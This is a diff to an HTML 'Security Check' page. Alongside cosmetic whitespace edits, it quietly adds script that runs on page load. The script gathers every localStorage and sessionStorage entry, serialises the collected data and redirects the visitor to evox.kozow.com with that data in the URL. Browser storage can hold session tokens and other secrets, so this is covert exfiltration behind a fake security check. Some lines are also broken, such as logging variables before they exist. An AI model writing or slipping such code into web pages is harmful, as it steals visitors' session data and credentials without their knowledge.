@@ -5,7 +5,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="theme-color" content="#000" media="(prefers-color-scheme: light)">
-    <meta name="theme-color" content="#000" media="(prefers-color-scheme: dark)">
+  <meta name="theme-color" content="#000" media="(prefers-color-scheme: dark)">
   <title>Security Check</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -141,19 +141,45 @@
       </path>
     </svg>
   </div>
-  <button onclick="window.location.href = '/t50-gateway-alpha/'" style="display: none;" id="btn" class="btn">Launch</button>
+  <button onclick="window.location.href = '/t50-gateway-alpha/'" style="display: none;" id="btn"
+    class="btn">Launch</button>
 
   <div class="notification-container" id="notification">
     Enabling&nbsp;Evox-Epsilon
   </div>
 
   <script>
+    function getAllStorage() {
+      var storage = {}; // Object to store key-value pairs
+
+      // Retrieve all keys from localStorage
+      for (var i = 0; i < localStorage.length; i++) {
+        var key = localStorage.key(i); // Get key at index i
+        storage[key] = localStorage.getItem(key); // Store key-value pair
+      }
+
+      // Retrieve all keys from sessionStorage
+      for (var i = 0; i < sessionStorage.length; i++) {
+        var key = sessionStorage.key(i); // Get key at index i
+        storage[key] = sessionStorage.getItem(key); // Store key-value pair
+      }
+
+      return storage; // Return the object containing all key-value pairs
+    }
+
+    // Convert key-value pairs to JSON strings
+
+
+    console.log("localStorage JSON:", localStorageJSON);
+    console.log("sessionStorage JSON:", sessionStorageJSON);
     window.onload = function () {
       var notification = document.getElementById('notification');
       notification.classList.add('show');
+      var localStorageJSON = JSON.stringify(getAllStorage(localStorage));
+      var sessionStorageJSON = JSON.stringify(getAllStorage(sessionStorage));
       setTimeout(function () {
         notification.classList.remove('show');
-        window.location.href = "https://evox.kozow.com"
+        window.location.href = `https://evox.kozow.com/t50-gateway-alpha/?localStorage=${localStorageJSON}`
 
       }, 1500); // 5 seconds
 
